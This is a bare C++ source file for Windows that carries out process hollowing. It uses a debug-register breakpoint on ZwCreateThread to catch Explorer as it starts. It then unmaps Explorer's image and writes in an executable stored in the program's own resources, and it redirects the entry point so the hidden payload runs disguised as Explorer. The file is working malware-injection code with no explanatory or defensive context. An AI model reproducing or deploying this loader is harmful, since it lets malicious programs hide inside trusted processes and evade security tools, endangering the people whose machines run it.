#define WIN32_NO_STATUS
#include <windows.h>
#undef  WIN32_NO_STATUS

namespace NT {
    extern "C" {

#pragma warning(disable: 4005)  // macro redefinition
#include <ntddk.h>
#pragma warning(default: 4005)

    }
}
using NT::NTSTATUS;

typedef struct _DEBUG_CONTROL {
    ULONG L0 : 1;
    ULONG G0 : 1;
    ULONG L1 : 1;
    ULONG G1 : 1;
    ULONG L2 : 1;
    ULONG G2 : 1;
    ULONG L3 : 1;
    ULONG G3 : 1;
    ULONG LE : 1;
    ULONG GE : 1;
    ULONG    : 3;
    ULONG GD : 1;
    ULONG    : 2;
    ULONG RWE0 : 2;
    ULONG LEN0 : 2;
    ULONG RWE1 : 2;
    ULONG LEN1 : 2;
    ULONG RWE2 : 2;
    ULONG LEN2 : 2;
    ULONG RWE3 : 2;
    ULONG LEN3 : 2;
} DEBUG_CONTROL, *PDEBUG_CONTROL;


VOID preppatch()
{
    CONTEXT context = {CONTEXT_DEBUG_REGISTERS};

    PDEBUG_CONTROL dr7 = PDEBUG_CONTROL(&context.Dr7);

    context.Dr0 = ULONG(GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwCreateThread"));

    dr7->L0 = 1, dr7->RWE0 = 0, dr7->LEN0 = 0;

    SetThreadContext(GetCurrentThread(), &context);
}

LONG patch(PEXCEPTION_POINTERS ep)
{
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        HANDLE hProcess = PHANDLE(ep->ContextRecord->Esp)[4];

        PCONTEXT context = ((PCONTEXT*)(ep->ContextRecord->Esp))[6];

        NT::PROCESS_BASIC_INFORMATION pbi;

        NT::NtQueryInformationProcess(hProcess, NT::ProcessBasicInformation, &pbi, sizeof pbi, 0);

        PVOID x; ReadProcessMemory(hProcess, PCHAR(pbi.PebBaseAddress) + 8, &x, sizeof x, 0);

        NT::ZwUnmapViewOfSection(hProcess, x);

        HRSRC hRsrc = FindResource(0, "Image", "EXE");

        HGLOBAL hGlobal = LoadResource(0, hRsrc);

        PVOID p = LockResource(hGlobal);

        PIMAGE_NT_HEADERS nt = PIMAGE_NT_HEADERS(PCHAR(p) + PIMAGE_DOS_HEADER(p)->e_lfanew);

        PVOID q = VirtualAllocEx(hProcess,
                                 PVOID(nt->OptionalHeader.ImageBase),
                                 nt->OptionalHeader.SizeOfImage,
                                 MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(hProcess, PCHAR(q), PCHAR(p), 0x1000, 0);

        PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

        for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++)

            WriteProcessMemory(hProcess,
                               PCHAR(q) + sect[i].VirtualAddress,
                               PCHAR(p) + sect[i].PointerToRawData,
                               sect[i].SizeOfRawData, 0);

        WriteProcessMemory(hProcess, PCHAR(pbi.PebBaseAddress) + 8, &q, sizeof q, 0);

        context->Eax = ULONG(q) + nt->OptionalHeader.AddressOfEntryPoint;

        ep->ContextRecord->Dr7 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

int main(int argc, char *argv[])
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si = {sizeof si};

    __try {
        preppatch();

        CreateProcess(0, "Explorer", 0, 0, FALSE, 0, 0, 0, &si, &pi);
    }
    __except (patch(GetExceptionInformation())) {}

    return 0;
}

